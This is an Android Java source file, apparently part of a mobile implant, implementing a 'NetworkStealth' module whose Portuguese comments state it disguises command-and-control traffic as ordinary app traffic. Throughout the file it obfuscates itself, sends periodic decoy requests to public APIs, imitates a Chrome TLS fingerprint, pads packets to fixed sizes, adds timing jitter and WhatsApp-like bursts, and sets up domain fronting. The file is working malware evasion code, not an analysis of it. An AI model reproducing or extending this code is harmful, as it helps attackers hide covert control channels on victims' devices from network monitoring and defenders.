package com.seguranca.protecao.stealth;

import android.content.Context;
import android.util.Log;
import okhttp3.ConnectionSpec;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.TlsVersion;
import okhttp3.CipherSuite;
import org.lsposed.lsparanoid.Obfuscate;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Módulo de evasão de análise de rede.
 * Camufla tráfego C2 como tráfego legítimo de apps comuns.
 */
@Obfuscate
public class NetworkStealth {

    private static final String TAG = "NS";
    private final Context context;
    private final SecureRandom random = new SecureRandom();
    private ScheduledExecutorService noiseScheduler;
    private OkHttpClient noiseClient;
    private volatile boolean isRunning = false;
    private volatile int stealthLevel = StealthProtocol.MODE_NORMAL;

    // URLs de APIs públicas para gerar ruído de tráfego legítimo
    private static final String[] NOISE_URLS = {
        "https://api.github.com/zen",
        "https://httpbin.org/get",
        "https://jsonplaceholder.typicode.com/posts/1",
        "https://api.ipify.org?format=json",
        "https://worldtimeapi.org/api/timezone/America/Sao_Paulo",
        "https://catfact.ninja/fact",
        "https://uselessfacts.jsph.pl/api/v2/facts/random",
        "https://official-joke-api.appspot.com/random_joke"
    };

    // Tamanhos padrão de padding para normalizar pacotes
    private static final int[] PADDING_TARGETS = {512, 1024, 2048, 4096};
    private static final byte PADDING_MARKER = (byte) 0xFE;

    public NetworkStealth(Context context) {
        this.context = context.getApplicationContext();
        this.noiseClient = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build();
    }

    /**
     * Aplica configurações de TLS stealth a um OkHttpClient.Builder.
     * Imita fingerprint de browser Chrome moderno.
     */
    public OkHttpClient.Builder wrapClient(OkHttpClient.Builder builder) {
        try {
            ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)
                .tlsVersions(TlsVersion.TLS_1_2, TlsVersion.TLS_1_3)
                .cipherSuites(
                    CipherSuite.TLS_AES_128_GCM_SHA256,
                    CipherSuite.TLS_AES_256_GCM_SHA384,
                    CipherSuite.TLS_CHACHA20_POLY1305_SHA256,
                    CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
                    CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
                    CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
                    CipherSuite.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
                    CipherSuite.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
                    CipherSuite.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256
                )
                .build();

            builder.connectionSpecs(Arrays.asList(spec, ConnectionSpec.CLEARTEXT));
        } catch (Exception e) {
            Log.e(TAG, "TLS config erro: " + e.getMessage());
        }
        return builder;
    }

    /**
     * Inicia geração de tráfego de ruído para mascarar comunicação C2.
     */
    public void start() {
        if (isRunning) return;
        isRunning = true;
        scheduleTrafficNoise();
        Log.d(TAG, "NetworkStealth ativo");
    }

    public void stop() {
        isRunning = false;
        if (noiseScheduler != null && !noiseScheduler.isShutdown()) {
            noiseScheduler.shutdownNow();
        }
    }

    /**
     * Agenda requisições de ruído periódicas a APIs públicas.
     */
    private void scheduleTrafficNoise() {
        noiseScheduler = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "noise");
            t.setDaemon(true);
            t.setPriority(Thread.MIN_PRIORITY);
            return t;
        });

        noiseScheduler.scheduleWithFixedDelay(() -> {
            if (!isRunning) return;

            try {
                // Seleciona URL aleatória
                String url = NOISE_URLS[random.nextInt(NOISE_URLS.length)];

                Request request = new Request.Builder()
                    .url(url)
                    .header("User-Agent", "Mozilla/5.0 (Linux; Android " +
                        android.os.Build.VERSION.RELEASE + ") AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36")
                    .header("Accept", "application/json, text/plain, */*")
                    .header("Accept-Language", "pt-BR,pt;q=0.9,en-US;q=0.8")
                    .build();

                try (Response response = noiseClient.newCall(request).execute()) {
                    // Consome o body para completar a requisição
                    if (response.body() != null) {
                        response.body().string();
                    }
                }
            } catch (IOException e) {
                // Silencioso — ruído que falha não é problema
            } catch (Exception e) {
                Log.e(TAG, "Noise erro: " + e.getMessage());
            }
        }, 
        15 + random.nextInt(30),  // Delay inicial: 15-45s
        getNoiseInterval(),       // Intervalo entre requests
        TimeUnit.SECONDS);
    }

    /**
     * Retorna intervalo entre requests de ruído baseado no nível de stealth.
     */
    private long getNoiseInterval() {
        switch (stealthLevel) {
            case StealthProtocol.MODE_PARANOID:
                return 10 + random.nextInt(20);  // 10-30s (mais tráfego para diluir)
            case StealthProtocol.MODE_STEALTH:
                return 30 + random.nextInt(60);  // 30-90s
            default:
                return 60 + random.nextInt(120); // 60-180s
        }
    }

    /**
     * Retorna um delay gaussiano para jitter de requests.
     * Média 200ms, desvio padrão 50ms, mínimo 50ms.
     */
    public long addJitter() {
        double delay = 200.0 + random.nextGaussian() * 50.0;
        return Math.max(50, (long) delay);
    }

    /**
     * Adiciona padding ao payload para normalizar tamanho do pacote.
     * Formato: [dados_originais][PADDING_MARKER][padding_bytes][2 bytes tamanho_original]
     */
    public byte[] padPayload(byte[] data) {
        if (data == null || data.length == 0) return data;

        try {
            int originalSize = data.length;

            // Encontra o menor tamanho alvo que comporta dados + overhead (3 bytes min)
            int targetSize = -1;
            for (int target : PADDING_TARGETS) {
                if (target >= originalSize + 3) {
                    targetSize = target;
                    break;
                }
            }

            // Se dados são maiores que maior alvo, usa próximo múltiplo de 4096
            if (targetSize == -1) {
                targetSize = ((originalSize + 3) / 4096 + 1) * 4096;
            }

            byte[] padded = new byte[targetSize];

            // Copia dados originais
            System.arraycopy(data, 0, padded, 0, originalSize);

            // Marca início do padding
            padded[originalSize] = PADDING_MARKER;

            // Preenche com bytes aleatórios
            byte[] noise = new byte[targetSize - originalSize - 3];
            random.nextBytes(noise);
            System.arraycopy(noise, 0, padded, originalSize + 1, noise.length);

            // Últimos 2 bytes = tamanho original (big-endian)
            padded[targetSize - 2] = (byte) ((originalSize >> 8) & 0xFF);
            padded[targetSize - 1] = (byte) (originalSize & 0xFF);

            return padded;
        } catch (Exception e) {
            Log.e(TAG, "Pad erro: " + e.getMessage());
            return data;
        }
    }

    /**
     * Remove padding e retorna dados originais.
     */
    public byte[] unpadPayload(byte[] padded) {
        if (padded == null || padded.length < 3) return padded;

        try {
            // Lê tamanho original dos últimos 2 bytes
            int originalSize = ((padded[padded.length - 2] & 0xFF) << 8) | (padded[padded.length - 1] & 0xFF);

            if (originalSize <= 0 || originalSize >= padded.length) {
                return padded; // Não tem padding
            }

            // Verifica marcador
            if (padded[originalSize] != PADDING_MARKER) {
                return padded; // Não tem padding
            }

            byte[] original = new byte[originalSize];
            System.arraycopy(padded, 0, original, 0, originalSize);
            return original;
        } catch (Exception e) {
            Log.e(TAG, "Unpad erro: " + e.getMessage());
            return padded;
        }
    }

    /**
     * Retorna delay de burst para simular padrões de tráfego de apps legítimos.
     * Apps como WhatsApp enviam mensagens em rajadas com intervalos variáveis.
     */
    public long getBurstDelay() {
        // 70% chance de delay curto (50-200ms), 30% de delay longo (500-2000ms)
        if (random.nextDouble() < 0.7) {
            return 50 + random.nextInt(150);
        } else {
            return 500 + random.nextInt(1500);
        }
    }

    /**
     * Configura domain fronting no request builder.
     */
    public Request.Builder applyDomainFronting(Request.Builder builder, String frontDomain, String realHost) {
        if (frontDomain != null && !frontDomain.isEmpty()) {
            builder.header("Host", realHost);
        }
        return builder;
    }

    public void setStealthLevel(int level) {
        this.stealthLevel = level;
    }
}
